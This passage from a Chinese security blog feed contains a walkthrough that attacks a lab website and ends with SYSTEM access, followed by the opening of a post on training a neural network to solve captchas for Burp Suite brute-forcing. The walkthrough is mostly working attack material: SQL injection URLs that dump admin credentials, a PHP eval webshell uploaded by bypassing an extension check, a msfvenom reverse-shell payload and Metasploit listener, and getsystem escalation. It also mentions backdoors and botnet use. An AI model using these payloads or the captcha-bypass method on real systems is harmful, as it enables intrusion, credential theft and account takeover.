<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%24%28BBF9%7B%40%60VK%5DJ5YB59PLDC8.png" alt=""><br>
首先我们在id=10后面加上一个单引号’进行判断<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%7DR0SQC6%40%25D0%24UCQD%28%7B_JBJB.png" alt=""><br>
这个时候我们发现回显的数据不正常，于是我们再加一个注释符号<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/EY%24%60%7BQF%5BOL_7B%7D1490~0NFR.png" alt=""><br>
发现数据这个时候回显的时候是正常的，到这一步我们已经可以确定这里存在一个sql注入漏洞</p>
<blockquote>
<p>原理我们可以简单解释一下<br>
在网站中，我们一般使用数据库存储网站数据，网站和数据库是存在一个交互性。网站所呈现的内容是由代码中写入的sql语句调用数据库中的内容进行一个呈现，例如我们刚刚看到的文字。<br>
而sql注入漏洞一般是由于程序员书写的sql语句不规范所导致的安全事件。</p>
</blockquote>
<p>例如网站源码中使用如下的sql语句进行查询<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/1T2AQDR%295S%5B5%5D5%28FBQV%29EU3.png" alt=""><br>
给语句结尾的where查询条件加上一个单引号’<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/9YFRLV58FSE9%605E%405%7B3F_%25W.png" alt=""><br>
很显然，我们传入的单引号和前面的单引号闭合，后面只有一个无法成对的单引号，然后报了语法错误。这个时候我们再加上<code>--+</code>注释符号注释掉后面的单引号<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/GSUAC7X6IS9%40_SDTJL%5DO4%60J.png" alt=""><br>
这个时候查询的数据就会正确回显出来。</p>
<p>原理简单解释了一下之后，我们回到刚刚的网站。<br>
这个时候我们发现存在sql注入漏洞之后，我们就开始进行查询对方网站数据库的数据，找到一些敏感信息，例如管理员的账号密码等等</p>
<p>首先，我们使用order by语句快速猜解出表中的列数<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/CZATPZQ%249%293I4%5DQCRB%7BR9G3.png" alt=""><br>
发现10列的时候报错，说明不足10列，我们继续缩小范围<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/JT6AZ1LLFZHL%4039EJE8OQ3E.png" alt=""><br>
再查询第8列的时候，发现数据回显正确，说明对方表中含有列数8<br>
我们使用union select 自定义查询测试一下，注意我们这里前面的id=10，要写成id=-10，把这里的查询置空<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/W8%25J%40U4%7D%5BD3HFH%7DNFML%25L_7.png" alt=""><br>
发现会分别回显第三列、第五列和第七列。接下来我们就可以在三、五、七处做做文章</p>
<p>查询数据库名字：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.1.167/yxlink/tuku/images.php?id=-10&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">database</span>(),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/EXY%40U7T%25JGYM6%25%7BD0G%29FZF0.png" alt=""><br>
得到数据库名字：qzn_zuiai</p>
<p>查询数据库中的表名：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.1.167/yxlink/tuku/images.php?id=-10&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&quot;qzn_zuiai&quot;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/64LOR%40WXDA7PCL2%5B8%40OWSJG.png" alt=""><br>
得到一共se2admin,se2fl,se2hd,se2nr,se2tufl,se2tunr,se2wz,se2zf,sj3sk九张表<br>
通过表名，我们猜测se2admin可能是存储管理员账号和密码的表，所以我们先查询这张表中的数据</p>
<p>查询表se2admin中的字段：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.1.167/yxlink/tuku/images.php?id=-10&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name),<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&quot;se2admin&quot;</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/2%24%60DI0KVJHJM5MK_S%29SZ~%40U.png" alt=""><br>
得到表中的字段值有id，name，pass等，接下来我们查询name和pass的字段值</p>
<p>查询字段值：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">http://192.168.1.167/yxlink/tuku/images.php?id=-10&#x27; union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">name</span>,<span class="number">4</span>,pass,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span> <span class="keyword">from</span> se2admin<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/DNM1KIWQ3~%29TL03T%408%5D9G%60X.png" alt=""><br>
我们得到管理员账号：admin，管理员账号密码：7fef6171469e80d32c0559f88b377245<br>
很显然密码值是被加密的md5值，所以我们去网上找md5网站进行撞库查询<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/N%29%5DIF%40X%25H%29789%7B~MNS6K0%5BY.png" alt=""><br>
得到管理员密码为：admin888<br>
接下来我们需要查找这个网站的后台地址，我们使用御剑进行一个扫描<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/OV8QOF%25%7D6CVVLGW_5TQ1%5DTN.png" alt=""><br>
御剑爆出了很多敏感地址，我们找到一个admin的目录，可能是后台地址，我们去访问一下<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/HCYIQ8PD4F%7BU5KVUEVY%7D9WG.png" alt=""><br>
输入我们刚刚得到的管理员账号和密码admin:admin888<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/P%40R%7BB8STI811URPWC%25%40GQ81.png" alt=""><br>
这个时候，我们成功进入对方网站后台。</p>
<h2 id="文件上传漏洞"><a class="header-anchor" href="#文件上传漏洞">¶</a>文件上传漏洞</h2>
<p>接下来我们再这里找到一个文件上传点<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/A%28GNMR3D%29O%60%29AH3MKVRQ20U.png" alt=""><br>
我们写一个简单的一句话木马</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>($_POST[<span class="string">&#x27;pass&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/H6JI8CKP%256M_8%5BFOZ1_VKUS.png" alt=""><br>
考虑到这里可能会对我们上传的文件进行一个后缀限制，例如只能上传jpg或者png图片格式文件等，所以我们把muma.txt改成muma.jpg格式<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/P0S3ZG_4XI%29%7BGX14%25RQRYUA.png" alt=""><br>
我们开启burpsuite，然后点提交，拦截到我们发送的数据包<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/FK_UC_0%25I%40Q~16XJN7%5B%601CQ.png" alt=""><br>
我们把muma.jpg改回php文件类型：muma.php<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%24%7BRYDZJ0T4EZ%29FABTKYE5%24J.png" alt=""><br>
然后发送数据包<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/CC8K%256%7DFP%7DHA%5B2ZUFJP%5DDGE.png" alt=""><br>
ok，已经上传成功，我们去找找我们上传后的路径<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/V8TW%7BRFNJ%40VVQ6ESZK60QYG.png" alt=""><br>
得到我们的上传完整路径为：<code>http://192.168.1.167/yxlink/img/img_3699336993.php</code><br>
我们使用蚁剑进行连接我们上传的木马<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/2_%5DLX62PYEDGHMP%6094SYA%29P.png" alt=""><br>
成功连接，进入到对方服务器<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/QN_%60%5BB%5BTHV18Z1QFL3L%5B9EP.png" alt=""><br>
到此，已成功拿到webshell</p>
<h1>反弹shell连接</h1>
<p>接下来我们利用kali的msf制作一个exe类型的反弹型木马</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=kali的ip LPORT=端口 -f 类型 -o 文件名</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/YDU1EFKR~H3D%28U6OD6X%7DZ%25U.png" alt=""><br>
把做好的木马，通过我们蚁剑刚刚连接的webshell进行上传<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/KUOL~L7CL4S%40%60GJXYIUU%295R.png" alt=""><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/L%25%40S3%5DE_A%40CF3_%251DUDNP%5BS.png" alt=""><br>
上传成功后，我们在kali启动msf<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/B%7B%40%40%607%604Y~JIBZFXIR4VC7O.png" alt=""></p>
<p><strong>执行监听</strong></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.131</span><br><span class="line">set lport 4444</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/9H%28VN~3CT57WQ1%7DL1MUQ_%7DB.png" alt=""><br>
<strong>执行木马</strong></p>
<p>msf开启监听之后，我们去蚁剑webshell执行我们上传的木马<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%5B%29C3QY%60V%7BV%282%29TRB%40VM7SBH.png" alt=""><br>
执行之后，回到kali，我们可以看到msf目标正在回连，创建Meterpreter会话成功<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/SIL%25NM%29X3G%293%5DZ4%25S1F%28BCF.png" alt=""></p>
<p><strong>提权</strong></p>
<p>首先查看一下我们的用户权限<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/%60H_A1%29K4%5DH3FWZ8FHFQDSMP.png" alt=""><br>
发现是普通用户权限，之前我们已经在webshell观察到对方是win7系统，所以我们采用的是windows的载荷攻击<br>
我们尝试使用getsystem进行提权试试<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/6%24I2J%24V91AJ%5D8RJDYHFLMNS.png" alt=""><br>
发现直接提权成功，现在我们拥有windows最高权限system<br>
接下来我们打印一下系统信息，并且拍照对方电脑现在状态<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/J8EE_%249FD%258GQ0%28%257%60%60BX14.png" alt=""><br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E6%A8%A1%E6%8B%9F%E7%BD%91%E7%AB%99%E6%94%BB%E5%87%BB%E5%88%B0%E6%8F%90%E6%9D%83%E7%9A%84%E8%BF%87%E7%A8%8B/CW%7BXP%7D_1%25%5BI6P8M%40M23J4SQ.png" alt=""><br>
ok，成功。</p>
<h1>结语</h1>
<p>在拿到system权限之后，我们可以干很多很多的事…例如给对方种下后门，拿来当肉鸡等等。。。<br>
这告诉我们开发网站必须注重安全，否则带来的后果是无穷大的。<br>
emmm…这波有点难受。</p>
<p><strong>注：本博客仅供技术研究，若将其信息做其他用途，由用户承担全部法律及连带责任，本博客不承担任何法律及连带责任，请遵守中华人民共和国安全法</strong></p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>卷积神经网络结合burpsuite实现渗透测试中的验证码爆破</title>
    <url>/posts/37998/</url>
    <content><![CDATA[<h1>前言</h1>
<p>首先，在这里要感谢c0ny1师傅开发的captcha-killer插件和Nick li大佬的开源项目，还有miniboom师傅提供的思路<br>
在平时我们进行渗透测试的时候，常常会遇到下面这种情况<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/D%7B5Y%29EA%7DE%25W0XE%5B1OL7MRVP.png" alt=""><br>
在网站的验证码无法绕过的情况下，我们又需要进行网站的爆破，但爆破得填写正确的验证码进行一个认证，这种情况下可能会劝退部分小伙伴们，这个时候如何处理这种问题成为了一个值得探讨的点。<br>
看过其他师傅的思路，在这里有一个有效的办法，就是采用深度学习的卷积神经网络对验证码进行训练识别，然后建立模型，调用burpsuite的插件captcha-killer获取识别接口进行爆破。</p>
<h1>安装</h1>
<h2 id="cnn-captcha的安装和使用"><a class="header-anchor" href="#cnn-captcha的安装和使用">¶</a>cnn_captcha的安装和使用</h2>
<h3 id="项目安装及环境准备"><a class="header-anchor" href="#项目安装及环境准备">¶</a>项目安装及环境准备</h3>
<p>项目为了方便已经转到我的github的仓库上，大家可以去我的仓库进行下载</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">项目地址：https:&#x2F;&#x2F;github.com&#x2F;dota-st&#x2F;cnn_captcha</span><br></pre></td></tr></table></figure>
<p>项目介绍：<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/%24QG3%40MNR4O%7DTVAZ%28Y748AU8.png" alt=""></p>
<p>项目使用python语言编写，所以需要搭建python环境，推荐下载python36版本。git clone 项目下来之后，对requirements.txt文件中的第三方库版本进行一个修改。tensorflow的版本改为1.15.3。如果你也想和我一样使用显卡来跑程序，就改成tensorflow-gpu==1.15.3。<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/0%40PNXSO4JL21W%7D~XU508D53.png" alt=""></p>
<blockquote>
<p>注意：pip最好进行换源，不然下载这些库的速度可能让你怀疑人生~这里推荐换源成豆瓣源</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip换源方法：</span><br><span class="line"></span><br><span class="line">找到python的安装路径下的site-packages\pip\_internal\models\index.py文件</span><br><span class="line">PyPI &#x3D; Index(&#39;https:&#x2F;&#x2F;pypi.python.org&#x2F;&#39;)</span><br><span class="line">修改成https:&#x2F;&#x2F;pypi.python.org&#x2F; 为 https:&#x2F;&#x2F;pypi.douban.com&#x2F;simple</span><br></pre></td></tr></table></figure>
<p>换源之后，敲pip install -r requirements.txt命令进行下载文本里的第三方库</p>
<h3 id="项目使用"><a class="header-anchor" href="#项目使用">¶</a>项目使用</h3>
<p>确认安装好python的第三方库之后，就可以开始模型的训练了~<br>
一开始，在没有图片验证码的数据集的情况下，我们可以借助gen_sample_by_captcha.py文件生成验证码的数据集</p>
<p>首先，我们需要去配置文件进行一个修改（当然不修改也可以）打开conf/captcha_config.json文件，修改成像我这样<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/_4_CH%7BQQ4867P%25%7D80DQ2%28TE.png" alt=""><br>
一开始我们就先训练纯数字的验证码模型，设置的过于复杂，模型的训练时间也会越长，想要有良好的识别率，就不得不进行多次训练。<br>
运行gen_sample_by_captcha.py文件，生成10000张图片文件<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/R2%29%24R8A08%40%608%40%5B%25ZQL3N%25%25K.png" alt=""><br>
在sample/origin目录下可以看见生成的图片<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/H%40PA%40K7FZO3%5D%40%25R%60Q1BIX3D.png" alt=""><br>
然后sample/origin目录下新建两个文件夹，train和test（不用创建也行，代码里会自动判断有无，进行创建）<br>
接下来需要使用verify_and_split_data.py文件，我们先看一下他的配置文件/conf/sample_config.json</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;origin_image_dir&quot;: &quot;sample&#x2F;origin&#x2F;&quot;,  # 原始文件</span><br><span class="line">  &quot;new_image_dir&quot;: &quot;sample&#x2F;new_train&#x2F;&quot;,  # 新的训练样本</span><br><span class="line">  &quot;train_image_dir&quot;: &quot;sample&#x2F;train&#x2F;&quot;,    # 训练集</span><br><span class="line">  &quot;test_image_dir&quot;: &quot;sample&#x2F;test&#x2F;&quot;,      # 测试集</span><br><span class="line">  &quot;api_image_dir&quot;: &quot;sample&#x2F;api&#x2F;&quot;,        # api接收的图片储存路径</span><br><span class="line">  &quot;online_image_dir&quot;: &quot;sample&#x2F;online&#x2F;&quot;,  # 从验证码url获取的图片的储存路径</span><br><span class="line">  &quot;local_image_dir&quot;: &quot;sample&#x2F;local&#x2F;&quot;,    # 本地保存图片的路径</span><br><span class="line">  &quot;model_save_dir&quot;: &quot;model&#x2F;&quot;,            # 从验证码url获取的图片的储存路径</span><br><span class="line">  &quot;image_width&quot;: 100,                    # 图片宽度</span><br><span class="line">  &quot;image_height&quot;: 60,                    # 图片高度</span><br><span class="line">  &quot;max_captcha&quot;: 4,                      # 验证码字符个数</span><br><span class="line">  &quot;image_suffix&quot;: &quot;png&quot;,                 # 图片文件后缀</span><br><span class="line">  &quot;char_set&quot;: &quot;0123456789abcdefghijklmnopqrstuvwxyz&quot;,  # 验证码识别结果类别</span><br><span class="line">  &quot;use_labels_json_file&quot;: false,                       # 是否开启读取&#96;labels.json&#96;内容</span><br><span class="line">  &quot;remote_url&quot;: &quot;http:&#x2F;&#x2F;127.0.0.1:6100&#x2F;captcha&#x2F;&quot;,      # 验证码远程获取地址</span><br><span class="line">  &quot;cycle_stop&quot;: 3000,                                  # 启动任务后的训练指定次数后停止</span><br><span class="line">  &quot;acc_stop&quot;: 0.99,                                    # 训练到指定准确率后停止</span><br><span class="line">  &quot;cycle_save&quot;: 500,                                   # 训练指定次数后定时保存模型</span><br><span class="line">  &quot;enable_gpu&quot;: 0,                                     # 是否开启GUP训练</span><br><span class="line">  &quot;train_batch_size&quot;: 128,                             # 训练时每次使用的图片张数，如果CPU或者GPU内存太小可以减少这个参数</span><br><span class="line">  &quot;test_batch_size&quot;: 100                               # 每批次测试时验证的图片张数，不要超过验证码集的总数</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们进行一个简单修改，打码部分是我自定义的地址，暂时可以保持原路径不变<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/HXWUB_WGG2%7DFJPI37AZCS%5BA.png" alt=""><br>
然后运行verify_and_split_data.py文件，程序会同时校验和分割origin和new_train两个目录中的图片,按照比例分到test和train文件夹中；<br>
<img src="https://blog-file-1302856486.cos.ap-guangzhou.myqcloud.com/%E5%8D%B7%E7%A7%AF%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E7%BB%93%E5%90%88burpsuite%E5%AE%9E%E7%8E%B0%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84%E9%AA%8C%E8%AF%81%E7%A0%81%E7%88%86%E7%A0%B4/~R77DWZRZXH4GH%252W%5BATK9O.png" alt=""><br>
后续有了更多的样本，可以把样本放在new_train目录中再次执行verify_and_split_data。<br>
程序会把无效的文件留在原文件夹。<br>
此外，当你有新的样本需要一起训练，可以放在sample/new目录下，再次运行verify_and_split_data.py即可。<br>
